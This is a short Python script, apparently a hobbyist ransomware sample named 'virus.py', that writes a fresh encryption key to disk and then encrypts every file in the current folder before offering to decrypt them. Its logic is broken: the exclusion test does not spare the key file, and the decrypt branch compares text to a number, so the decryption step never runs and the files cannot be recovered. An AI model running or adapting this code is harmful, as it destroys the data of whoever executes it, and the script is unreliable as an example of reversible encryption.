import os
from cryptography.fernet import Fernet
import time

key=Fernet.generate_key()

with open("key.key","wb") as keyfile:
	keyfile.write(key)
with open("key.key","rb") as keyfile:
    
    fernet=Fernet(keyfile.read())
    #find the files in the folder and encrypt them
    
    for files in os.listdir():
        if files != 'virus.py' and 'key.key':
            with open(files,"rb") as f:
                data=f.read()
            with open(files,'wb') as f:
                encrypted=fernet.encrypt(data)
                
                f.write(encrypted)

time.sleep(5)
   
print("Your data has been encrypted!") 
choice=input("Press 1 to decrypt:")

if choice==1:
    for files in os.listdir():
        if files != 'virus.py' and 'key.key':
            with open(files,"rb") as f:
                data=f.read()
            with open(files,'wb') as f:
                decrypted=fernet.decrypt(data)
                
                f.write(decrypted)
                
print("Your data has been decrypted!!")
               
            
    
                
        
    




